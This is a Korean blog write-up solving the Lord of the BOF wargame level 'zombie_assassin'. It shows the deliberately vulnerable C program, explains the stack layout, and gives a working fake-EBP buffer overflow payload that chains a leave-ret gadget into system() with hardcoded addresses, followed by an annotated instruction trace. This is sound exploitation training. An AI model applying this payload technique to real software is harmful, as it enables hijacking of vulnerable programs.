---
title: The Lord of the BOF - assassin -> zombie_assassin
date: 2017-01-04 17:14:00 +0900 KST
categories: [write-up]
---

코드는 이렇다.

```c
/*
    The Lord of the BOF : The Fellowship of the BOF
    - zombie_assassin
    - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
    char buffer[40];

    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }

    if(argv[1][47] == '\xbf')
    {
        printf("stack retbayed you!\n");
        exit(0);
    }

    if(argv[1][47] == '\x40')
    {
        printf("library retbayed you, too!!\n");
        exit(0);
    }

    // strncpy instead of strcpy!
    strncpy(buffer, argv[1], 48);
    printf("%s\n", buffer);
}
```

구조상

01 ~ 40: 버퍼

41 ~ 44: sfp

45 ~ 48: ret

이렇게 되고, 이 공간만 내가 쓸 수 있다.

푸는 건 FEBP를 검색해서 풀었다.

sfp에 내가 쓰고 싶은 스택 주소를 넣어주면 leave 명령어가 실행될 때
ebp에 내가 입력한 스택 주소가 입력된다.
그리고 ret 주소를 leave ret이 있는 주소로 지정해준다.

이게 무슨 말이냐 하면...

일단 페이로드부터 보자

```sh
./zombie_assassin `python -c 'print "A"*4 + "\xe0\x8a\x05\x40" + "B"*4 + "\xf9\xbf\x0f\x40" + "C"*24 + "\xa0\xfa\xff\xbf" + "\xdf\x84\x04\x08"'`
```

0xbffffaa0은 AAAA 문자열이 있는 주소다.

0x080484df는 leave와 ret 명령어가 있는 주소다.

실행 과정을 잘 써보면 이렇게 된다.

```nasm
main:
    push ebp (sfp에 ebp PUSH)
    mov ebp, esp
leave:
    mov esp, ebp
    pop ebp (sfp에서 0xbffffaa0 POP)
ret:
    pop eip (ret에서 0x080484df POP)
leave:
    mov esp, ebp (이제 스택 위치는 0xbffffaa0)
    pop ebp (0xbffffaa0에서 0x41414141 POP)
ret:
    pop eip (0xbffffaa4에서 0x40058ae0 POP)
system:
    push ebp (0xbffffaa4에 0x41414141을 PUSH)
    mov ebp, esp
leave:
    mov esp, ebp
    pop ebp (0xbffffaa4에서 0x41414141 POP)
ret:
    pop eip (0xbffffaa8에서 0x42424242 POP)
0x42424242:
    ???
```
